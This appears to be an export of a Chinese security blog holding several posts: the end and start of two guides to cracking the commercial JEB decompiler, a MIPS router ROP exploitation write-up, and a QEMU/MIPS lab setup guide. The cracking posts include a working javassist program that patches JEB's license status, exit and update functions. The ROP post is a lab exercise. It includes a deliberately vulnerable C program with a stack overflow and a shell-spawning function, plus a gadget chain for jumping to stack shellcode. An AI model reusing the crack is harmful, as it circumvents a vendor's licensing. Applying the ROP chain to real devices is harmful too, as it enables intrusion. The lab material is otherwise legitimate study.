var0.append(mW.UU(new byte[]&#123;8, 23, 20, 92, 68, 7, 26, 17, 23, 28, 11, 17, 91&#125;, 1, 122));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (allowAnyClient()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;82, 15, 23, 84, 78, 15, 5, 12, 11, 26, 91&#125;, 1, 51));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-85, 9, 0, 15, 10, 10, 8, 13, 65, 78, 15, 5, 12, 11, 26, 91&#125;, 1, 196));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (canUseCoreAPI()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;32, 0, 2, 28, 95, 8, 23, 1&#125;, 2, 169));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-27, 1, 66, 78, 12, 29, 23, 72, 76, 17, 25&#125;, 1, 139));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return var0.toString();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static String getLicense() &#123;</div><div class="line">        byte[] var0 = AssetManager.UU(&quot;LICENSE.TXT&quot;);</div><div class="line">        return var0 == null ? null : Strings.decodeUTF8(var0);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static String getChangeList() &#123;</div><div class="line">        byte[] var0 = AssetManager.UU(&quot;CHANGELIST.TXT&quot;);</div><div class="line">        return var0 == null ? null : Strings.decodeUTF8(var0);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后patch掉退出函数和更新检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">package me.hacklh;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.Launcher;</div><div class="line">import javassist.ClassPool;</div><div class="line">import javassist.CtClass;</div><div class="line">import javassist.CtMethod;</div><div class="line">import javassist.CtNewMethod;</div><div class="line">import com.pnfsoftware.jeb.client.Licensing;</div><div class="line"></div><div class="line"></div><div class="line">public class JebCracker &#123;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line"></div><div class="line">//        com.pnfsoftware.jeb.installer.Launcher.main(new String[]&#123;&quot;--di&quot;&#125;);</div><div class="line">//        DES.main(args);</div><div class="line">//         Launcher.main(new String[]&#123;&quot;--generate-key&quot;&#125;);</div><div class="line">        CtClass.debugDump = &quot;./debugDump/&quot;;</div><div class="line"></div><div class="line">        System.out.println(Licensing.allowAnyClient());</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 修改getStatus， AbstractContext会起几个线程修改status</div><div class="line">         */</div><div class="line">        ClassPool pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        CtClass old_class = pool.get(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        CtMethod old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getStatus&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return 0;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;terminate&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">        /**</div><div class="line">         * patch 掉与网络下载有关的函数，禁止升级</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;downloadBinary&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;httpPost&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(long[].class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509071049085jtzkc8nm.png?imageslim" alt="paste image"></p>
<p><strong>mips版</strong><br>类似</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>可以在jeb的官网下载其他平台的适配包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.pnfsoftware.com/jeb2/support-package</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> jeb破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jeb 2.3.7 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之路由器环境修复&&rop技术分析]]></title>
      <url>/2017/10/26/step_by_step_pwn_router_part2.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
<hr>
<p>拿到路由器的固件后，第一时间肯定是去运行目标程序，一般是web服务程序。我们可以去 <code>/etc/init.d/</code> 找启动文件，或者看看一些有可能的目录。一般来说路由器的程序很少的情况下是可以直接用qemu运行起来的。我们需要做一些修复的工作，本文会介绍一个常用的方法，后面会分析在 <code>mips uclibc</code> 中常用的 <code>rop</code> 手法。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>运行环境修复</strong></p>
<p>由于路由器运行时会去 nvram中获取配置信息，而我们的qemu中是没有该设备，路由器中的程序可能会因为没法获取配置信息而退出。我们可以使用    <code>https://github.com/zcutlip/nvram-faker</code> 配合着设置 <code>LD_PRELOAD</code> 环境变量来使用( 类似于一种 <code>hook</code> )。如果你的mips交叉编译工具链和它脚本里面的不一样就要修改它的脚本，比如</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15090309370211cupr2kg.png?imageslim" alt="paste image"><br>编译后把 <code>libnvram-faker.so</code> 和 <code>nvram.ini</code> 放到 <code>/</code> 目录，然后使用 <code>LD_PRELOAD</code>来加载。即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mips-static -E LD_PRELOAD=/libnvram-faker.so  /usr/bin/httpd</div></pre></td></tr></table></figure>
<p>如果程序还会在其他地方保错，就要自己分析程序，然后根据实际情况，在 <code>nvram-faker</code> 增加 <code>hook代码</code></p>
<p>注：</p>
<ul>
<li>要注意目标应用是用的 <code>glibc</code> 还是 <code>uclibc</code> ,从而选择对应的交叉编译工具链来进行编译。</li>
<li>先使用 <code>firmadyne</code> 运行看看，然后优先选择 <code>qemu-system-mips-static</code>来调试，实在不行用 <code>qemu-system</code></li>
<li>如果需要某些静态编译（给生成的Makefile里面增加 <code>-static</code> 选项）的程序，建议去 <code>qemu-system</code> 编译，交叉编译太麻烦了。</li>
</ul>
<hr>
<p><strong>MIPS ROP分析</strong></p>
<p>看了 <a href="http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/" target="_blank" rel="external">Exploiting a MIPS Stack Overflow</a> 做的实验，因为    <code>tplink</code>上没有对应版本的固件了。于是只能自己写一个栈溢出的程序，并配合着gdb调试，来模拟整个rop过程。</p>
<p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;  </div><div class="line">#include &lt;stdlib.h&gt;  </div><div class="line">#include &lt;unistd.h&gt;  </div><div class="line"></div><div class="line"></div><div class="line">void getshell()&#123;</div><div class="line">    system(&quot;sh&quot;);</div><div class="line">    sleep(1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;  </div><div class="line">    char buf[128]; </div><div class="line">    read(STDIN_FILENO, buf, 256);  </div><div class="line">&#125;  </div><div class="line">   </div><div class="line">int main(int argc, char** argv) &#123; </div><div class="line">	printf(&quot;%p\n&quot;, (int *)write); </div><div class="line">    vulnerable_function();  </div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为要使用 <code>qemu-mips-static</code> 来调试程序，这样就不方便找到libc的基地址。于是在程序运行时把libc中的函数地址打印出来，然后计算基地址，便于我们找到gadgets具体在内存中的位置。然后使用 uclibc的交叉编译工具链来编译。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/home/haclh/router_exploit/cross-compiler-mips/bin/mips-gcc level1.c -o level1</div></pre></td></tr></table></figure></p>
<p>把它扔到一个路由器文件系统目录中，这样就不用单独拷贝它依赖的lib了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15090326039915db83l6b.png?imageslim" alt="paste image"></p>
<p>可以看到程序使用了 uClibc，通过查看qemu的maps，找到uClibc的路径<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090327179167od9lz52.png?imageslim" alt="paste image"></p>
<p>拿到ida中分析找 gadgets.具体可以看上面的那篇文章。找到的gadgets如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">rop_gad1:</div><div class="line">	LOAD:00055C60                 li      $a0, 1</div><div class="line">	LOAD:00055C64                 move    $t9, $s1</div><div class="line">	LOAD:00055C68                 jalr    $t9 ; sub_55960</div><div class="line">	LOAD:00055C5C                 lui     $s0, 2</div><div class="line"></div><div class="line">gadg_2</div><div class="line"></div><div class="line">	LOAD:0001E20C                 move    $t9, $s1</div><div class="line">	LOAD:0001E210                 lw      $ra, 0x28+var_4($sp)</div><div class="line">	LOAD:0001E214                 lw      $s2, 0x28+var_8($sp)</div><div class="line">	LOAD:0001E218                 lw      $s1, 0x28+var_C($sp)</div><div class="line">	LOAD:0001E21C                 lw      $s0, 0x28+var_10($sp)</div><div class="line">	LOAD:0001E220                 jr      $t9</div><div class="line">	LOAD:0001E224                 addiu   $sp, 0x28</div><div class="line"></div><div class="line"></div><div class="line">rop_gad3:</div><div class="line">	LOAD:000164C0                 addiu   $s2, $sp, 0x198+var_180</div><div class="line">	LOAD:000164C4                 move    $a2, $v1</div><div class="line">	LOAD:000164C8                 move    $t9, $s0</div><div class="line">	LOAD:000164CC                 jalr    $t9 ; mempcpy</div><div class="line">	LOAD:000164D0                 move    $a0, $s2</div><div class="line"></div><div class="line"></div><div class="line">rop_gad4:</div><div class="line">	LOAD:000118A4                 move    $t9, $s2</div><div class="line">	LOAD:000118A8                 jalr    $t9</div></pre></td></tr></table></figure></p>
<p>rop的过程，和对应的sp寄存器的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">sp:0x76fff710</div><div class="line">首先进入 rop_gad1， $s1 gadg_2</div><div class="line"></div><div class="line">sp:0x76fff710</div><div class="line">进入 gadg_2，这时$s1还是gadg_2， 从内存加载数据到寄存器s1--&gt;sleep, ra--&gt; rop_gad3, $s0---&gt;rop_gad4</div><div class="line"></div><div class="line">sp:0x76fff738</div><div class="line">再次进入 gadg_2,s1--&gt;sleep, ra--&gt; rop_gad3, $s0---&gt;rop_gad4</div><div class="line"></div><div class="line">sp:0x76fff760</div><div class="line">进入 rop_gad3， 获取栈地址到$s2,跳到 $s0</div><div class="line"></div><div class="line"></div><div class="line">进入rop_gad4，s2--&gt;0x76fff778 跳进栈中，。。。</div></pre></td></tr></table></figure></p>
<p><strong>gdb调试的部分截图</strong></p>
<p>断在函数返回地址被覆盖的时候，使用gdb命令，设置<code>$pc</code>寄存器的值，伪造劫持程序流程到 rop_gad1<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033066831ysbgu293.png?imageslim" alt="paste image"></p>
<p>汇编代码如下<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033106631mwc1gl07.png?imageslim" alt="paste image"></p>
<p>第一次进入rop_gad2<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090332319233l54m90b.png?imageslim" alt="paste image"></p>
<p>第二次运行到 rop_gad2 时的寄存器状态。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033335464zv8t8p6f.png?imageslim" alt="paste image"></p>
<p><code>t9</code> 指向 <code>sleep</code>函数，接下来调用 <code>sleep(1)</code> 刷新 <code>cache</code>, 便于后面指向 <code>shellcode</code>。次数的 <code>$ra</code> 为 <code>rop_gad3</code>的地址，便于在 <code>sleep</code> 返回后继续 <code>rop</code> ,获取一个栈的指针到寄存器，便于后面直接跳过去。</p>
<p>进入rop_gad3</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033654570mt5p9xro.png?imageslim" alt="paste image"></p>
<p>进入 rop_gad4,跳到栈上执行shellcode</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509033720821o12bll0r.png?imageslim" alt="paste image"></p>
<p>分析完毕。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>修复环境要注意使用的gcc, 必要时自己跟踪，逆向代码，修复运行环境。看了几篇mips漏洞利用的文章，rop的思路就是上面的思路，估计那就是通用思路吧，记录下来，以备不时只需。调rop的过程还是有趣的。</p>
<p>参考链接：</p>
<p><a href="http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/" target="_blank" rel="external">http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/</a></p>
<p>注：</p>
<p>&emsp;&emsp;本文先发布于：<a href="https://xianzhi.aliyun.com/forum/topic/1509/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1509/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 路由器安全 </tag>
            
            <tag> 路由器环境修复 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之环境搭建]]></title>
      <url>/2017/10/26/step_by_step_pwn_router_part1.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
<hr>
<p>正式进入路由器的世界了。感觉路由器这块就是固件提取，运行环境修复比较麻烦，其他部分和一般的 pwn 差不多。由于大多数路由器是 mips 架构的，本文就以搭建  <code>MIPS运行、调试平台</code> 为例介绍环境的搭建。其他架构类似。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h6 id="安装-与-配置-Qemu"><a href="#安装-与-配置-Qemu" class="headerlink" title="安装 与 配置 Qemu:"></a>安装 与 配置 Qemu:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install qemu </div><div class="line">sudo apt-get install qemu-user-static</div><div class="line">sudo apt-get install qemu-system</div></pre></td></tr></table></figure>
<p>配置网络</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install bridge-utils uml-utilities</div></pre></td></tr></table></figure>
<p>修改 <code>/etc/network/interfaces</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">auto lo </div><div class="line">iface lo inet loopback </div><div class="line"># ubuntu 16.04的系统用ens33代替eth0 </div><div class="line">auto eth0 </div><div class="line">iface eth0  inet manual </div><div class="line">up ifconfig eth0  0.0.0.0 up </div><div class="line">auto br0</div><div class="line">iface br0 inet dhcp </div><div class="line">bridge_ports eth0 </div><div class="line">bridge_stp off </div><div class="line">bridge_maxwait 1</div></pre></td></tr></table></figure>
<p>修改 <code>/etc/qemu-ifup</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#!/bin/sh </div><div class="line">echo &quot;Executing /etc/qemu-ifup&quot; </div><div class="line">echo &quot;Bringing $1 for bridged mode...&quot; </div><div class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up </div><div class="line">echo &quot;Adding $1 to br0...&quot; </div><div class="line">sudo /sbin/brctl addif br0 $1 </div><div class="line">sleep 3</div></pre></td></tr></table></figure></p>
<p>增加权限   <code>chmod a+x /etc/qemu-ifup</code></p>
<p>重启网络服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/networking restart</div></pre></td></tr></table></figure></p>
<p><strong>下载与运行qemu的镜像</strong></p>
<p><em>uclibc交叉编译工具链 和 qemu系统镜像</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.uclibc.org/downloads/binaries/0.9.30.1/</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150902839201120b9a6l3.png?imageslim" alt="paste image"></p>
<p><em>运行示例（解压，运行即可）</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo qemu-system-mips -M malta -nographic -no-reboot -kernel &quot;zImage-mips&quot; -hda &quot;image-mips.ext2&quot; -append &quot;root=/dev/hda rw init=/usr/sbin/init.sh panic=1 PATH=/usr/bin console=ttyS0&quot; -net nic -net tap -drive file=/tmp/share.img</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509028462257nom8v9ce.png?imageslim" alt="paste image"></p>
<p><em>openwrt预先编译好的内核，mips小端</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://downloads.openwrt.org/snapshots/trunk/malta/generic/</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509028533709dnukk3fx.png?imageslim" alt="paste image"><br><em>运行</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo qemu-system-mipsel -kernel openwrt-malta-le-vmlinux-initramfs.elf -M malta  -drive file=/tmp/share.img -net nic -net tap -nographic</div></pre></td></tr></table></figure></p>
<p> <em>debian mips qemu镜像 </em><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://people.debian.org/~aurel32/qemu/mips/</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509028870417m16zceue.png?imageslim" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap -nographic</div></pre></td></tr></table></figure>
<p>时间比较长<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090291042864rohh3lo.png?imageslim" alt="paste image"></p>
<h4 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h4><p>一个类似于 peda的gdb插件，支持多种架构，pwn最强gdb插件。用了它之后发现ida的调试简直渣渣。一张图说明一切。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15090290758339f3u420n.png?imageslim" alt="paste image"><br>安装的话按照github上的说明即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/pwndbg/pwndbg</div></pre></td></tr></table></figure></p>
<p>要用来调试MIPS的话，要安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt install gdb-multiarch</div></pre></td></tr></table></figure></p>
<p>然后按照正常的gdb使用就行。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509029269607h15gm0sd.png?imageslim" alt="paste image"></p>
<h4 id="安装firmadyne"><a href="#安装firmadyne" class="headerlink" title="安装firmadyne"></a>安装firmadyne</h4><p>一个路由器运行环境，傻瓜化操作，但是无法调试……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/firmadyne/firmadyne</div></pre></td></tr></table></figure></p>
<h4 id="安装mipsrop插件"><a href="#安装mipsrop插件" class="headerlink" title="安装mipsrop插件"></a>安装mipsrop插件</h4><p>貌似其他的rop工具都不能检测处mips的 gadgets,这个不错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/devttys0/ida/tree/master/plugins/mipsrop</div></pre></td></tr></table></figure></p>
<p>扔到ida的plug目录即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509029647708zje4hzns.png?imageslim" alt="paste image"></p>
<h4 id="安装-PleaseROP-插件"><a href="#安装-PleaseROP-插件" class="headerlink" title="安装 PleaseROP 插件"></a>安装 PleaseROP 插件</h4><p>jeb 2.3+ 的适用于arm , mips通用 rop gadgets搜索插件<br><a href="https://github.com/pnfsoftware/PleaseROP" target="_blank" rel="external">PleaseROP</a></p>
<p>下载后放到jeb根目录的 <code>coreplugins</code> 目录下，重新打开Jeb即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509090395335ni62umpx.png?imageslim" alt="paste image"></p>
<p>找到的结果可以在下面位置找到</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509090463437ew1n3zjs.png?imageslim" alt="paste image"></p>
<h4 id="binwalk完整安装"><a href="#binwalk完整安装" class="headerlink" title="binwalk完整安装"></a>binwalk完整安装</h4><p>一定要安装完整的版本不然有些固件解不了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://blog.csdn.net/qq1084283172/article/details/65441110</div></pre></td></tr></table></figure></p>
<h4 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h4><p>各种平台的静态编译版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/mzpqnxow/embedded-toolkit</div></pre></td></tr></table></figure></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很简单，就这样</p>
<p>参考链接：</p>
<p><a href="http://blog.csdn.net/qq1084283172/article/details/70176583" target="_blank" rel="external">http://blog.csdn.net/qq1084283172/article/details/70176583</a></p>
<p>注：</p>
<p>&emsp;&emsp;本文先发布于：<a href="https://xianzhi.aliyun.com/forum/topic/1508/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1508/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 路由器安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java应用破解之破解 jeb mips 2.3.3 ]]></title>
      <url>/2017/10/23/crack_jeb_mips_2_3_3.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于要去学习路由器相关的漏洞利用技术的学习，而许多的路由器都是 <code>mips架构</code>  的，<code>IDA</code> 又不能反编译 <code>mips</code> , 发现 <code>jeb</code> 的新版支持 <code>mips的反编译</code> ，于是去官网申请一个试用版，试用版的限制还是比较多的，比如 <code>使用时间验证</code>，<code>没法复制粘贴</code> 等，于是想尝试看看能否破解，同时填了 <code>java破解</code> 这个坑。</p>
<hr>
<p>本文主要记录的是破解过程中的思路和使用的一些工具，技巧。文末有处理后的数据。</p>
<hr>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>  <code>jeb</code> 的主要逻辑在 <code>jeb.jar</code> 中，该文件会在程序运行起来后释放到程序目录中的其中一个子目录下，使用 <code>Everything</code> 搜 <code>jeb.jar</code> 就可以找到文件的位置。找到文件后就可以逆向分析了。本文重点不在逆向这方面，而是要介绍我破解这个软件的一个大概的流程。</p>
<p>  下面介绍几个在整个流程中起到重要作用的工具。</p>
<ul>
<li><code>Btrace</code>  —-&gt; hook java系统函数，打印堆栈，找关键方法</li>
<li><code>javassist</code> —-&gt;  修改字节码</li>
<li><code>IDEA</code> ——&gt;  动态调试jar包</li>
</ul>
<p>试用版的一个最无语的限制就是必须要联网才能使用，不联网就会直接退出了，就是如此暴力。但是这对我们来说则是绝佳的条件。我们可以使用 Btrace <code>hook java.lang.System.exit</code> 函数，然后打印堆栈信息，就可以定位到在退出前所调用的方法，一般来说，在方法之间肯定会有离关键方法很近的方法，或者直接就是我们要找的目标方法。<br>这个是之前破解的，现在我重新测试时，提示 <code>超过试用期</code>，然后就退出了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820496115nl8oskut.png?imageslim" alt="paste image"></p>
<p>不管怎样有异常就好，然后hook  <code>java.lang.System.exit</code> 打印堆栈信息就可以看到一些jeb自己写一些方法的的信息了。</p>
<p>Btrace脚本如下</p>
